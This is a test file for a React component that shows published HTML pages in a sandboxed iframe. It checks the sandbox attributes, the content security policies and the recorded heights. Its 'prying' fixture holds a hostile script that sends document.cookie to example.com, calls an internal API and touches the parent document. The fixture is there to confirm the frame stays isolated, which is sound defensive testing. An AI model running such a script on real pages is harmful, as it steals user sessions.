import { markupDom } from "../../../test/markupDom";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vite-plus/test";

import { PublishedPageFrame } from "./PublishedPage";
import {
  PAGE_POLICY,
  WRAPPER_POLICY,
  innerDocumentOf,
} from "@t3tools/client-runtime/zerops/publishedPage";

const theme = { scheme: "light" as const, vars: { "--background": "#fff" } };
/** A page that tries every way out: the Mate's own API, the network, the person's session. */
const prying = `<script>fetch("/mate/api/assets/objects");fetch("https://example.com/?c="+document.cookie);
parent.document.title="x";</script><img src="https://example.com/pixel.png"><form action="https://example.com"></form>`;

const frameOf = (html: string | null, failed = false) =>
  markupDom(
    renderToStaticMarkup(
      <PublishedPageFrame title="Launch plan" html={html} theme={theme} failed={failed} />,
    ),
  ).querySelector("iframe");

describe("a published page in the conversation", () => {
  it("a published page cannot reach the network or the Mate's files", () => {
    const frame = frameOf(prying);
    expect(frame).not.toBeNull();
    // Scripts alone: no same origin (the Mate's server, the session), no popups, forms or top navigation.
    expect(frame!.getAttribute("sandbox")).toBe("allow-scripts");
    expect(frame!.getAttribute("src")).toBeNull();
    const wrapper = frame!.getAttribute("srcdoc")!;
    expect(wrapper).toContain(`content="${WRAPPER_POLICY}"`);
    const doc = innerDocumentOf(wrapper)!;
    const policy = doc.indexOf(`content="${PAGE_POLICY}"`);
    expect(policy).toBeGreaterThan(-1);
    expect(policy).toBeLessThan(doc.indexOf("fetch("));
    expect(PAGE_POLICY).toContain("default-src 'none'");
    expect(frame!.getAttribute("title")).toBe("Launch plan");
  });

  // Run 9 (Milo, step 5): reloaded, a recorded 369 px page stood in its 240 px first box for the
  // list's first measure, and the conversation landed 320 px short of its end and glided there.
  it("a page with a recorded height stands at it from its first paint, before its width is read", () => {
    const box = markupDom(
      renderToStaticMarkup(
        <PublishedPageFrame
          title="Launch plan"
          html={null}
          theme={theme}
          heights={[
            [640, 520],
            [1180, 369],
          ]}
        />,
      ),
    ).querySelector("div[data-state]");
    expect(box?.getAttribute("style")).toMatch(/height:\s*369px/u);
  });

  it.each([
    { title: "while it is read", html: null, failed: false },
    { title: "when it could not be read", html: null, failed: true },
  ])("holds no frame $title", ({ html, failed }) => {
    expect(frameOf(html, failed)).toBeNull();
  });
});
